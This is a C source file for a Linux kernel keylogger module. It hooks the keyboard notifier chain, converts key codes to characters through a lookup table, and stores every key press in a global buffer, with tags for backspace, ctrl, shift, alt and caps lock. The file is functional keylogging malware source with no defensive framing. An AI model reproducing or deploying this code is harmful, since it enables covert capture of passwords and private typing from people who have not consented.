#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>
#include "keylogger.h"

char keystrokes[BUFFER_SIZE];
static char *pkeystrokes;

// notifier block to register keystrokes
struct notifier_block nb = {
	.notifier_call = keylogger_notifier
};

#define add_string_keystrokes(key)										\
if(pkeystrokes + strlen(key) < keystrokes + sizeof(char)*BUFFER_SIZE){	\
	strncpy(pkeystrokes,key,strlen(key));								\
	pkeystrokes += strlen(key);											\
}

// table for easily converting key codes to ascii
#define SPACE_KEY_CODE	0x39
#define FIRST_KEY_CODE	0x2
#define LAST_KEY_CODE	0x35
const char character_table[] = {
	'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\0', '\t',
	'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', '\0',
	'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '\n', '\0', '\\',
	'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'
};

static void add_keycode(int key_code);
static void add_special_keycode(int key_code);

int init_keylogger(void) {
	memset(keystrokes, 0, sizeof(keystrokes));
	pkeystrokes = keystrokes;

	// register the keyboard notifier, for keyboard interrupts
	if (register_keyboard_notifier(&nb)) {
		return -1;
	}

	return 0;
}

// unregister the keyboard notifier
void exit_keylogger(void) {
	unregister_keyboard_notifier(&nb);
}

// this will be called when there are new keyboard events
int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *data) {
	struct keyboard_notifier_param *param = (struct keyboard_notifier_param *) data;
	int key_code;

	// check if the event is a key press and if it is down
	if (action == KBD_KEYCODE && param->down == 1) {
		// get the key code of the key pressed
		key_code = param->value;
		add_keycode(key_code);
	}

	return NOTIFY_OK;
}

// take a key code and add it to the keylog keystrokes
static void add_keycode(int key_code) {
	char ascii = '\0';

	if (key_code >= FIRST_KEY_CODE && key_code <= LAST_KEY_CODE) {	// if in table
		ascii = character_table[key_code - FIRST_KEY_CODE];
	} else if (key_code == SPACE_KEY_CODE) {						// if space key
		ascii = ' ';
	}

	// add to buffer, if there is memory in the buffer
	if (ascii && pkeystrokes < keystrokes + sizeof(char)*BUFFER_SIZE) {
		*(pkeystrokes++) = ascii;
	}

	// try to add key in case of a non ascii one
	add_special_keycode(key_code);
}

// in case of a "non-ascii" key
static void add_special_keycode(int key_code){
	switch(key_code){
		case 0xe:
			add_string_keystrokes("_BACKSPACE_")
			break;

		case 0x1d:
		case 0xe0:
			add_string_keystrokes("_CTRL_")
			break;

		case 0x2a:
		case 0x36:
			add_string_keystrokes("_SHIFT_")
			break;

		case 0x38:
		case 0x64:
			add_string_keystrokes("_ALT_")
			break;

		case 0x3a:
			add_string_keystrokes("_CAPSLOCK_")
			break;

		default:
			break;
	}
}

